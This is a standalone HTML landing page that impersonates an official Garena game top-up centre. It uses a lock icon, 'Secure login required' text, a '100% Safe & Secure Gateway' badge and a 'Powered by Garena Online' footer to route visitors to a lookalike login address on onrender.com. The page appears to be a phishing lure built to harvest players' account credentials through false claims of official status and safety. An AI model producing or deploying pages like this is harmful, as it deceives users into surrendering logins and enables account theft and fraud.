<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Top Up Center</title>
    <style>
        body {
            background-color: #0f1115;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background-color: #1a1d24;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            text-align: center;
            max-width: 400px;
            width: 90%;
            border: 1px solid #2d313a;
        }
        .lock-icon {
            background-color: #da291c;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px auto;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #a1a1aa;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .badge {
            background-color: rgba(52, 168, 83, 0.1);
            color: #34a853;
            padding: 10px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: bold;
            margin-bottom: 30px;
            border: 1px solid rgba(52, 168, 83, 0.2);
        }
        .btn {
            background-color: #da291c;
            color: white;
            text-decoration: none;
            padding: 16px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 16px;
            display: block;
            transition: 0.3s;
        }
        .btn:hover {
            background-color: #b82217;
        }
        .footer {
            margin-top: 30px;
            font-size: 11px;
            color: #52525b;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="lock-icon">
            <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
        </div>
        <h1>Official Top Up Center</h1>
        <p>Secure login required to continue.</p>
        <div class="badge">✓ 100% Safe & Secure Gateway</div>
        <a href="https://garena-official-topup-centre.onrender.com" class="btn">CONTINUE TO LOGIN</a>
        <div class="footer">Powered by Garena Online.</div>
    </div>
</body>
</html>
